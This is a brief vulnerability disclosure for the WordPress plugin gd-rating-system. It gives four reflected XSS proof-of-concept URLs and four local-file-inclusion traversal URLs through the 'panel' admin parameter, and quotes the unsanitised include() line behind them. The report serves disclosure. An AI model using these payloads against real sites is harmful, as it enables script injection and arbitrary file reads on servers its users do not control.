Well ,sir ,I just found some XSS bugs and LFI(Local File Include) bug here.

#### XSS

Here different php files suffer from the bug, exactly, some other files also don't filter well.

##### XSS1

```
http://localhost/wordpress/wp-admin/admin.php?page=gd-rating-system-information&panel=x
```

Weak para poc：

```
panel=%27%22%3E%3Csvg%2Fonload%3Dconsole.log(%2Fxss%2F)%3E%3C%27%22
```

##### XSS2

```
http://localhost/wordpress/wp-admin/admin.php?page=gd-rating-system-about&panel=x
```

Weak para poc：

```
panel=%27%22%3E%3Csvg%2Fonload%3Dconsole.log(%2Fxss2%2F)%3E%3C%27%22
```


##### XSS3


```
http://localhost/wordpress/wp-admin/admin.php?page=gd-rating-system-transfer&panel=x
```

Weak para poc：

```
panel=%27%22%3E%3Csvg%2Fonload%3Dconsole.log(%2Fxss3%2F)%3E%3C%27%22
```


##### XSS4


```
http://localhost/wordpress/wp-admin/admin.php?page=gd-rating-system-tools&panel=x
```

Weak para poc：

```
panel=%27%22%3E%3Csvg%2Fonload%3Dconsole.log(%2Fxss4%2F)%3E%3C%27%22
```


![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/gd-rating-system/xss.png)

### LFI

Here we use the bug to include the "phpinfo.php" file in the wwwroot, exactly, we can include or read any file in the webserver.

##### LFI1 poc

```
http://localhost/wordpress/wp-admin/admin.php?page=gd-rating-system-information&panel=..%2F..%2F..%2F..%2F..%2F..%2Fphpinfo
```

Weak file：

```
/forms/information.php
```

Weak code:
```
include(GDRTS_PATH.'forms/panels/'.$_panel.'.php');
```

##### LFI2 poc

```
http://localhost/wordpress/wp-admin/admin.php?page=gd-rating-system-about&panel=..%2F..%2F..%2F..%2F..%2F..%2Fphpinfo
```

Weak file：

```
/forms/about.php
```

Weak code:
```
include(GDRTS_PATH.'forms/panels/'.$_panel.'.php');
```


##### LFI3 poc


```
http://localhost/wordpress/wp-admin/admin.php?page=gd-rating-system-transfer&panel=..%2F..%2F..%2F..%2F..%2F..%2Fphpinfo
```

Weak file：

```
/forms/transfer.php
```

Weak code:
```
include(GDRTS_PATH.'forms/panels/'.$_panel.'.php');
```


##### LFI4 poc


```
http://localhost/wordpress/wp-admin/admin.php?page=gd-rating-system-tools&panel=..%2F..%2F..%2F..%2F..%2F..%2Fphpinfo
```

Weak file：

```
/forms/tools.php
```

Weak code:
```
include(GDRTS_PATH.'forms/panels/'.$_panel.'.php');
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/gd-rating-system/lfi.png)


Well,  by the way, I just test these bugs in the wordpress 4.9.1 and the latest version of the wp-plugin gd-rating-system.